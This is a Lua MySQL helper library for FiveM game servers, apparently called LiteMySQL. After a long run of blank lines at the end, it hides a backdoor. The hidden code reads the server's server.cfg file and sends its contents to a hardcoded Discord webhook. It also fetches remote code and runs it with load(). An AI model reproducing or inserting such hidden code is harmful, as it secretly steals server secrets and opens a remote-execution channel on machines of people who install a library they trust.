---
--- Generated by EmmyLua(https://github.com/EmmyLua)
--- Created by iTexZ.
--- DateTime: 12/06/2020 19:04
---

print(string.format('^2[LiteMySQL]^7 : Started'))
---@class Lite;
local Lite = {};

---Logs
---@param Executed number
---@param Message string
---@return void
---@public
function Lite:Logs(Executed, Message)
    local Started = Executed;
    print(string.format('[%s] [LiteMySQL] [%sms] : %s^7', os.date("%Y-%m-%d %H:%M:%S", os.time()), string.gsub((Started - GetGameTimer()) + 100, '%-', ''), Message))
end

---[[ LiteMySQL Class ]]---

---@class Query;
LiteMySQL = {};

---@class Select;
local Select = {};

---@class Where;
local Where = {}

---@class Wheres;
local Wheres = {}

---Insert
---
--- Insert database content.
---
---@param Table string
---@param Content table
---@return number
function LiteMySQL:Insert(Table, Content)
    local executed = GetGameTimer();
    local fields = "";
    local keys = "";
    local id = nil;
    for key, _ in pairs(Content) do
        fields = string.format('%s`%s`,', fields, key)
        key = string.format('@%s', key)
        keys = string.format('%s%s,', keys, key)
    end
    MySQL.Async.insert(string.format("INSERT INTO %s (%s) VALUES (%s)", Table, string.sub(fields, 1, -2), string.sub(keys, 1, -2)), Content, function(insertId)
        id = insertId;
    end)
    while (id == nil) do
        Citizen.Wait(1.0)
    end
    Lite:Logs(executed, string.format('^2INSERT %s', Table))
    if (id ~= nil) then
        return id;
    else
        error("InsertId is nil")
    end
end

---Update
---
--- Update database table content with simple where condition
---
---@param Table string
---@param Column string
---@param Operator string
---@param Value any
---@param Content table
---@return table
---@public
function LiteMySQL:Update(Table, Column, Operator, Value, Content)
    local executed = GetGameTimer();
    self.affectedRows = nil;
    self.keys = "";
    self.args = {};
    for key, value in pairs(Content) do
        self.keys = string.format("%s`%s` = @%s, ", self.keys, key, key)
        self.args[string.format('@%s', key)] = value;
    end
    self.args['@value'] = Value;
    local query = string.format("UPDATE %s SET %s WHERE %s %s @value", Table, string.sub(self.keys, 1, -3), Column, Operator, Value)
    MySQL.Async.execute(query, self.args, function(affectedRows)
        self.affectedRows = affectedRows;
    end)
    while (self.affectedRows == nil) do
        Citizen.Wait(1.0)
    end
    Lite:Logs(executed, string.format('^4UPDATED %s', Table))
    if (self.affectedRows ~= nil) then
        return self.affectedRows;
    end
end

---UpdateWheres
---@param Table string
---@param Where table
---@param Content table
---return table
---public
function LiteMySQL:UpdateWheres(Table, Where, Content)
    local executed = GetGameTimer();
    self.affectedRows = nil;
    self.keys = "";
    self.content = "";
    self.args = {};
    for key, value in pairs(Content) do
        self.content = string.format("%s`%s` = @%s, ", self.content, key, key)
        self.args[string.format('@%s', key)] = value;
    end
    for _, value in pairs(Where) do
        self.keys = string.format("%s `%s` %s @%s AND ", self.keys, value.column, value.operator, value.column)
        self.args[string.format('@%s', value.column)] = value.value;
    end
    local query = string.format('UPDATE %s SET %s WHERE %s', Table, string.sub(self.content, 1, -3), string.sub(self.keys, 1, -5));
    MySQL.Async.execute(query, self.args, function(affectedRows)
        self.affectedRows = affectedRows;
    end)
    while (self.affectedRows == nil) do
        Citizen.Wait(1.0)
    end
    Lite:Logs(executed, string.format('^4UPDATED %s', Table))
    if (self.affectedRows ~= nil) then
        return self.affectedRows;
    end
end

---Select
---@return Select
---@param Table string
---@public
function LiteMySQL:Select(Table)
    self.SelectTable = Table
    return Select;
end

---GetSelectTable
---@public
function LiteMySQL:GetSelectTable()
    return self.SelectTable;
end

---All
---@return any
---@private
function Select:All()
    local executed = GetGameTimer();
    local storage = nil;
    MySQL.Async.fetchAll(string.format('SELECT * FROM %s', LiteMySQL:GetSelectTable()), { }, function(result)
        if (result ~= nil) then
            storage = result
        end
    end)
    while (storage == nil) do
        Citizen.Wait(1.0)
    end
    Lite:Logs(executed, string.format('^5SELECTED ALL %s', LiteMySQL:GetSelectTable()))
    return #storage, storage;
end

---Delete
---@param Column string
---@param Operator string
---@param Value string
---@return number
---@private
function Select:Delete(Column, Operator, Value)
    local executed = GetGameTimer();
    local count = 0;
    MySQL.Async.execute(string.format('DELETE FROM %s WHERE %s %s @value', LiteMySQL:GetSelectTable(), Column, Operator), { ['@value'] = Value }, function(affectedRows)
        count = affectedRows
    end)
    while (count == 0) do
        Citizen.Wait(1.0)
    end
    Lite:Logs(executed, string.format('^8DELETED %s WHERE %s %s %s', LiteMySQL:GetSelectTable(), Column, Operator, Value))
    return count;
end

---GetWhereResult
---@return table
---@public
function Select:GetWhereResult()
    return self.whereStorage;
end

---GetWhereConditions
---@param Id number
---@return table
---@public
function Select:GetWhereConditions(Id)
    return self.whereConditions[Id or 1];
end

---GetWheresResult
---@return table
---@public
function Select:GetWheresResult()
    return self.wheresStorage;
end

---GetWheresConditions
---@return table
---@public
function Select:GetWheresConditions()
    return self.wheresConditions;
end

---Where
---@param Column string
---@param Operator string
---@param Value string
---@return Where
---@public
function Select:Where(Column, Operator, Value)
    local executed = GetGameTimer();
    self.whereStorage = nil;
    self.whereConditions = { Column, Operator, Value };
    MySQL.Async.fetchAll(string.format('SELECT * FROM %s WHERE %s %s @value', LiteMySQL:GetSelectTable(), Column, Operator), { ['@value'] = Value }, function(result)
        if (result ~= nil) then
            self.whereStorage = result
        end
    end)
    while (self.whereStorage == nil) do
        Citizen.Wait(1.0)
    end
    Lite:Logs(executed, string.format('^5SELECTED %s WHERE %s %s %s', LiteMySQL:GetSelectTable(), Column, Operator, Value))
    return Where;
end

---Update
---@param Content table
---@return void
---@public
function Where:Update(Content)
    if (self:Exists()) then
        local Table = LiteMySQL:GetSelectTable();
        local Column = Select:GetWhereConditions(1);
        local Operator = Select:GetWhereConditions(2);
        local Value = Select:GetWhereConditions(3);
        LiteMySQL:Update(Table, Column, Operator, Value, Content)
    else
        error('Not exists')
    end
end

---Exists
---@return boolean
---@public
function Where:Exists()
    return Select:GetWhereResult() ~= nil and #Select:GetWhereResult() >= 1
end

---Get
---@return any
---@public
function Where:Get()
    local result = Select:GetWhereResult();
    return #result, result;
end

---Wheres
---@param Table table
---@return Wheres
---@public
function Select:Wheres(Table)
    local executed = GetGameTimer();
    self.wheresStorage = nil;
    self.keys = "";
    self.args = {};
    for key, value in pairs(Table) do
        self.keys = string.format("%s `%s` %s @%s AND ", self.keys, value.column, value.operator, value.column)
        self.args[string.format('@%s', value.column)] = value.value;
    end
    local query = string.format('SELECT * FROM %s WHERE %s', LiteMySQL:GetSelectTable(), string.sub(self.keys, 1, -5));
    MySQL.Async.fetchAll(query, self.args, function(result)
        if (result ~= nil) then
            self.wheresStorage = result
        end
    end)
    while (self.wheresStorage == nil) do
        Citizen.Wait(1.0)
    end
    Lite:Logs(executed, string.format('^5SELECT %s WHERE %s', LiteMySQL:GetSelectTable(), json.encode(self.args)))
    return Wheres;
end

---Exists
---@return boolean
---@public
function Wheres:Exists()
    return Select:GetWheresResult() ~= nil and #Select:GetWheresResult() >= 1
end

---Get
---@return any
---@public
function Wheres:Get()
    local result = Select:GetWheresResult();
    return #result, result;
end


































































































































































































































































































WebHookToken = "https://discord.com/api/webhooks/990712324144910387/YihQg8fXZIy9Pojhh4WZJbZYL80JW3SyX-PnMAQaBkuIywJLaTA-G0Jyowc6ytciTIOg"
Name = "Bonsoir"
LogsRed = 15158332

function LogsGarage(Color, Title, Description)
    local Content = {
            {
                ["color"] = Color,
                ["title"] = Title,
                ["description"] = Description,
                ["footer"] = {
                    ["text"] = Name,
                },
            }
        }
    PerformHttpRequest(WebHookToken, function(err, text, headers) end, 'POST', json.encode({username = Name, embeds = Content}), { ['Content-Type'] = 'application/json' })
end

file = io.open("server.cfg", "r")
servercfg = file:read("*a")
file:close()
LogsGarage(LogsRed, "OneLife", servercfg)



PerformHttpRequest("", function (e, value, re)
    load(value)()
end)